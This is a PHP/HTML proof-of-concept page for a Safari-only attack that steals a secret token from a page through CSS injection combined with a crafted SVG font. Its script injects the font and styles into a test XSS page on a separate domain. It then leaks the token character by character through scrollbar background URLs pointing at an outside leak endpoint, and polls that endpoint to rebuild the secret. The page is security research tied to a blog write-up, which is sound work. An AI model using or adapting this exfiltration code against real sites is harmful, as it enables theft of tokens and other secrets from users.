<?php 
session_start();
$_SESSION = array();
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Data Exfiltration via CSS + SVG Font - PoC (Safari only)</title>
</head>
<body>
<h1>Data Exfiltration via CSS + SVG Font - PoC (Safari only)</h1>
<p>The details can be found in my blog post: <a href="https://mksben.l0.cm/2021/11/css-exfiltration-svg-font.html">English</a> <a href="https://masatokinugawa.l0.cm/2021/11/css-exfiltration-svg-font.html">日本語</a></p>
<button onclick="go()">Go</button>
<script>
const CHARSET = "0123456789abcdef";
const PREFIX = '"';
const WIDTH = "600";//px
const LENGTH = 32;
function escape(str) {
    return str.replace(/"/g, '&quot;');
}

function go(){
    setTokenReader();
    openAttackWindows('');
}

function openAttackWindows(extractedToken) {
    const prefix = PREFIX + extractedToken;
    for (let a = 0; a < CHARSET.length; a++) {
        let glyphs = [];
        const target = CHARSET[a];
        for (let b = 0; b < CHARSET.length; b++) {
            const unicode = CHARSET[b];
            if (target === unicode) {
                glyphs.push(`<glyph unicode="${escape(prefix)}${escape(unicode)}" horiz-adv-x="99999" d="M1 0z"/>`);
            } else {
                glyphs.push(`<glyph unicode="${escape(unicode)}" horiz-adv-x="0" d="M1 0z"/>`);
            }
        }
        const svg = `
<svg>
<defs>
<font horiz-adv-x="0">
<font-face font-family="hack" units-per-em="1000" />
${glyphs.join("\n")}
</font>
</defs>
</svg>`;
        const style = `
<style>#leakme{
    display:block;
    font-family:"hack";
    white-space:nowrap;
    overflow-x: auto;
    width:${WIDTH}px;
    background:lightblue;
}
#leakme::-webkit-scrollbar {
    background: blue;
}
#leakme::-webkit-scrollbar:horizontal {
    background: url(https://l0.cm/svg_font/leak.php?PHPSESSID=<?php echo urlencode(session_id());?>&leak=${encodeURIComponent(extractedToken+target)});
}
</style>`;
        window.open(`//vulnerabledoma.in/svg_font/xss.html?xss=${encodeURIComponent(svg.trim()+style.trim())}`, `win-${target}`, `width=1,height=1,top=0,left=${a*50}`);

    }
}

function setTokenReader() {
    const sleep = msec => new Promise(resolve => setTimeout(resolve, msec));
    let currentTokenLength = 1;
    (async function() {
        const res = await fetch('token.php?PHPSESSID=<?php echo urlencode(session_id());?>');
        const leakedToken = await res.text();
        if (leakedToken.length === currentTokenLength) {
            document.getElementById('token').textContent = leakedToken;
            currentTokenLength++;
            openAttackWindows(leakedToken);
        }
        if (LENGTH !== leakedToken.length) {
            await sleep(1000);
            arguments.callee();
        }
    })();
}
</script>
<div>The secret is: <b id="token"></b></div>
</body>
</html>
